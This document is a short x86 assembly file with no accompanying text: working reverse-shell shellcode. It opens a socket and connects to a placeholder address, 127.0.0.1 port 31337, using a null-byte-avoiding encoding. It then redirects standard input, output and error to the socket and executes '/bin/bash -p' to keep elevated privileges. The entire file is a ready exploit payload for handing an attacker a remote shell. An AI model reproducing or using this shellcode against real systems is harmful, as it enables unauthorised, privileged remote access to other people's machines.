BITS 32
; socket(AF_INET, SOCK_STREAM, 0);
push BYTE 0x66
pop eax ; sockcall()
cdq

xor ebx, ebx
inc ebx ; SYS_SOCKET

push edx
push ebx
push BYTE 0x02

mov ecx, esp ; args = {AF_INET, SOCK_STREAM, 0}
int 0x80

; connect(fd, {AF_INET, 31337, 127.0.0.1}, 16);
xchg esi, eax
push BYTE 0x66
pop eax ; sockcall()

inc ebx

push 0x01aaaa7f
mov WORD [esp+1], dx
push WORD 0x697a
push WORD bx
mov ecx, esp ; {AF_INET, 31337, 127.0.0.1}

inc ebx ; SYS_CONNECT

push 0x10
push ecx
push esi
mov ecx, esp ; args = {fd, &sockaddr_in, 16}

int 0x80

; dup2(fd, 2-0)
xchg ebx, esi
push BYTE 0x2
pop ecx

dup_loop:
mov BYTE al, 0x3f ; dup2
int 0x80
dec ecx
jns dup_loop

; execve("/bin/bash", {"/bin/bash", "-p", NULL}, NULL);
mov BYTE al, 0x0b ; execve

push edx
push BYTE 0x68
push 0x7361622f
push 0x6e69622f
mov ebx, esp ; ebx = /bin/bash

push edx
push WORD 0x702d
mov ecx, esp ; ecx = -p

push edx
push ecx
push ebx
mov ecx, esp ; argv = {"/bin/bash", "-p", NULL}

int 0x80
